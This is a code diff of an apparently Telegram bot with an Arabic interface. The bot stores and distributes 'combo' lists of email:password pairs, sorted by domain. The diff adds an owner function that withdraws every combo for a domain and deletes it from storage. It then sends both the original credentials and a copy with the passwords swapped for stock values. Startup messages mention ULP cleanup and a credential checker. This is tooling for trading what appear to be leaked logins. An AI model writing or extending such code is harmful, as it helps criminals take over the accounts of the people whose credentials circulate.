             user_action_state.pop(user_id, None)
@@ -1429,11 +1764,53 @@ async def process_text_inputs(client: Client, message: Message):
                 await message.reply("❌ قيمة غير صالحة.")
             return
 
+async def owner_full_withdrawal(client: Client, domain: str, limit_count: int, message: Message):
+    results = await fetch_and_delete_combos(domain, limit_count)
+    
+    if not results:
+        await message.reply(f"❌ لا توجد حسابات للدومين `{domain}`.")
+        return
+    
+    original_content = "\n".join(results)
+    original_file = io.BytesIO(original_content.encode("utf-8"))
+    original_file.name = f"{domain}_original_{len(results)}.txt"
+    
+    modified_lines = []
+    for line in results:
+        parts = line.split(':')
+        if len(parts) >= 2:
+            email = parts[0]
+            new_password = random.choice(PASSWORD_REPLACEMENTS)
+            modified_lines.append(f"{email}:{new_password}")
+        else:
+            modified_lines.append(line)
+    
+    modified_content = "\n".join(modified_lines)
+    modified_file = io.BytesIO(modified_content.encode("utf-8"))
+    modified_file.name = f"{domain}_modified_{len(results)}.txt"
+    
+    await client.send_document(
+        chat_id=message.chat.id,
+        document=original_file,
+        caption=f"📄 <b>النسخة الأصلية</b>\n🌐 الدومين: `{domain}`\n📊 العدد: <b>{len(results):,}</b> حساب\n✅ بدون أي تعديل"
+    )
+    
+    await client.send_document(
+        chat_id=message.chat.id,
+        document=modified_file,
+        caption=f"🔄 <b>النسخة المعدلة</b>\n🌐 الدومين: `{domain}`\n📊 العدد: <b>{len(results):,}</b> حساب\n🔑 تم تغيير الباسوردات"
+    )
+    
+    record_withdrawal(message.from_user.id, domain, len(results), 0)
+    log_search_domain(domain)
+    increment_operations()
+    
+    await message.reply(f"✅ تم سحب <b>{len(results):,}</b> حساب للدومين `{domain}` وإرسال نسختين.")
+
 @app.on_callback_query(filters.regex("^get_"))
 async def callback_get_combos(client: Client, callback: CallbackQuery):
     user_id = callback.from_user.id
     
-    # إذا كان المالك - لا نسمح له بالدخول إلى هذه الدالة (يستخدم نظام السحب الشامل الخاص)
     if is_owner(user_id):
         await callback.answer("👑 استخدم زر البحث العادي للسحب الشامل.", show_alert=True)
         return
@@ -1505,7 +1882,7 @@ async def callback_get_combos(client: Client, callback: CallbackQuery):
     except Exception:
         pass
 
-# ==================== الأزرار الإدارية الكاملة ====================
+# ==================== الأزرار الإدارية ====================
 @app.on_message(filters.regex("^🗑 حذف حسب دومين$") & filters.user(OWNER_IDS))
 async def ask_delete_domain(client: Client, message: Message):
     user_action_state[message.from_user.id] = "awaiting_delete_domain"
@@ -1610,8 +1987,7 @@ async def bot_status_details(client: Client, message: Message):
 async def total_operations_count(client: Client, message: Message):
     await message.reply(f"📈 إجمالي العمليات الناجحة في البوت: <b>{get_total_operations():,}</b> عملية")
 
-# ==================== الإدارة ====================
-@app.on_message(filters.regex("^🧾 قناة السجل \(Audit Log\)$") & filters.user(OWNER_IDS))
+@app.on_message(filters.regex("^🧾 قناة السجل$") & filters.user(OWNER_IDS))
 async def audit_log_settings(client: Client, message: Message):
     await message.reply(f"🧾 قناة السجل الحالية: <code>{get_log_channel() or 'غير محددة'}</code>\nلتغييرها:\n`/set_log_channel -100xxx`")
 
@@ -1713,7 +2089,7 @@ async def ask_file(client: Client, message: Message):
 async def handle_large_document(client: Client, message: Message):
     temp_path = None
     try:
-        msg = await message.reply("⏳ جاري الرفع المعالجة...")
+        msg = await message.reply("⏳ جاري الرفع والمعالجة...")
         temp_path = await message.download()
         added = await asyncio.to_thread(add_combos_from_file, temp_path)
         await msg.edit_text(f"✅ تمت الإضافة بنجاح: <b>{added:,}</b>")
@@ -1727,6 +2103,6 @@ async def handle_large_document(client: Client, message: Message):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running with all buttons active & ULP cleanup feature...")
-    print("👑 Owner full withdrawal with duplicate files (original + modified passwords) enabled.")
+    print("🤖 Bot is running with checker feature integrated...")
+    print("👑 All owner buttons active...")
     app.run()
